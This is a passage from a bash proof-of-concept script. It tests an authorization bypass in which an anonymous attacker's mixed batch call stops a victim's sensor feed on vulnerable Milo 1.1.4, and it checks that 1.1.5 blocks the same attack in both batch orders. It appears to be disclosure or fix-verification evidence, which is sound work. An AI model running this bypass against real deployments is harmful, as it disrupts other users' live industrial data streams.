if [ "${LIVE_STOPFEED:-0}" -ge 1 ] 2>/dev/null && [ "${LIVE_FINAL_BAD:-0}" -gt 0 ] 2>/dev/null; then
  record_verdict "Row6" "mixed [readStatus,stopSensorFeed] vuln -- victim watching" PASS "BYPASS CONFIRMED: victim disrupted (goodTicks=${LIVE_FINAL_GOOD:-0} badTicks=${LIVE_FINAL_BAD:-0}, stopSensorFeed=$LIVE_STOPFEED) while attacker saw only denial/timeout"
else
  record_verdict "Row6" "mixed [readStatus,stopSensorFeed] vuln -- victim watching" FAIL "victim NOT disrupted -- unexpected on a vulnerable 1.1.4 build (stopSensorFeed=$LIVE_STOPFEED badTicks=$LIVE_FINAL_BAD)"
fi

# --- ROW 6r: live attack, REVERSED order, VULNERABLE --------------------------------------------
live_attack_phase "Row6r" l2r "$VULN_JAR" "mixed-batch-stopfeed-rev" \
  "row6r-attack-victim-disrupted-reversed-vulnerable-1.1.4.log" \
  "Row 6r: THE LIVE ATTACK, REVERSED ORDER -- anonymous attacker's mixed CallRequest [stopSensorFeed, readStatus] against vulnerable Milo 1.1.4 -- proves the live-victim disruption is order-independent, same as Row 3r"
if [ "${LIVE_STOPFEED:-0}" -ge 1 ] 2>/dev/null && [ "${LIVE_FINAL_BAD:-0}" -gt 0 ] 2>/dev/null; then
  record_verdict "Row6r" "mixed [stopSensorFeed,readStatus] REVERSED vuln -- victim watching" PASS "BYPASS CONFIRMED (order-independent): victim disrupted (goodTicks=${LIVE_FINAL_GOOD:-0} badTicks=${LIVE_FINAL_BAD:-0})"
else
  record_verdict "Row6r" "mixed [stopSensorFeed,readStatus] REVERSED vuln -- victim watching" FAIL "victim NOT disrupted in reversed order -- unexpected on a vulnerable 1.1.4 build"
fi

# --- ROW 7: live attack, forward order, FIXED ----------------------------------------------------
live_attack_phase "Row7" l3 "$FIXED_JAR" "mixed-batch-stopfeed" \
  "row7-fixed-control-victim-unaffected-1.1.5.log" \
  "Row 7: identical live mixed-batch attack against fixed Milo 1.1.5 -- clean CallResponse denying stopSensorFeed, and the independent third LegitClient session (separate process) sees its stream continue uninterrupted, proving the fix protects third parties too"
if [ "${LIVE_STOPFEED:-1}" = "0" ] && [ "${LIVE_FINAL_BAD:-1}" = "0" ] 2>/dev/null; then
  record_verdict "Row7" "mixed [readStatus,stopSensorFeed] fixed -- victim watching" PASS "victim unaffected (goodTicks=${LIVE_FINAL_GOOD:-0} badTicks=0)"
else
  record_verdict "Row7" "mixed [readStatus,stopSensorFeed] fixed -- victim watching" FAIL "fix DID NOT hold: stopSensorFeed=$LIVE_STOPFEED badTicks=$LIVE_FINAL_BAD"
fi

# --- ROW 7r: live attack, REVERSED order, FIXED ---------------------------------------------------
live_attack_phase "Row7r" l3r "$FIXED_JAR" "mixed-batch-stopfeed-rev" \
  "row7r-fixed-control-victim-unaffected-reversed-1.1.5.log" \
  "Row 7r: identical REVERSED-order live mixed-batch attack against fixed Milo 1.1.5 -- victim stream must stay uninterrupted regardless of batch order"
if [ "${LIVE_STOPFEED:-1}" = "0" ] && [ "${LIVE_FINAL_BAD:-1}" = "0" ] 2>/dev/null; then
  record_verdict "Row7r" "mixed [stopSensorFeed,readStatus] REVERSED fixed -- victim watching" PASS "victim unaffected (goodTicks=${LIVE_FINAL_GOOD:-0} badTicks=0)"
else
  record_verdict "Row7r" "mixed [stopSensorFeed,readStatus] REVERSED fixed -- victim watching" FAIL "fix DID NOT hold in reversed order: stopSensorFeed=$LIVE_STOPFEED badTicks=$LIVE_FINAL_BAD"
fi

rm -f "$VULN_JAR" "$FIXED_JAR"
RUN_END_EPOCH=$(date +%s)
RUN_DURATION_SEC=$((RUN_END_EPOCH - RUN_START_EPOCH))

# =================================================================================================
# VERDICT SUMMARY -- concise, screenshot-friendly; full transcripts remain in evidence/
# =================================================================================================
hr; echo "VERDICT SUMMARY -- the mixed-batch bypass (Call service mixed-batch authorization bypass)"; hr
printf "%-6s | %-58s | %s\n" "Row" "Scenario" "Result"
printf "%-6s-+-%-58s-+-%s\n" "------" "----------------------------------------------------------" "------"
for row in "${VERDICT_ROWS[@]}"; do
  IFS='|' read -r id desc status detail <<< "$row"
  printf "%-6s | %-58s | %s\n" "$id" "$desc" "$status"
done
hr
echo "Runtime: ${RUN_DURATION_SEC}s   Evidence: $EVIDENCE_DIR   Environment/hashes: $EVIDENCE_DIR/environment.log"
echo
if [ "$FAIL_COUNT" -eq 0 ]; then
  echo "OVERALL: ALL $((${#VERDICT_ROWS[@]})) SCENARIOS BEHAVED EXACTLY AS EXPECTED FOR THIS BUILD PAIR."
  echo "         (vulnerable 1.1.4 bypassed on every mixed-batch variant; fixed 1.1.5 blocked every one)"
else
  echo "OVERALL: $FAIL_COUNT of ${#VERDICT_ROWS[@]} SCENARIO(S) DID NOT MATCH EXPECTATIONS -- see [FAIL] rows above."
fi
hr

if [ "$FAIL_COUNT" -ne 0 ]; then
  exit 1
fi
exit 0
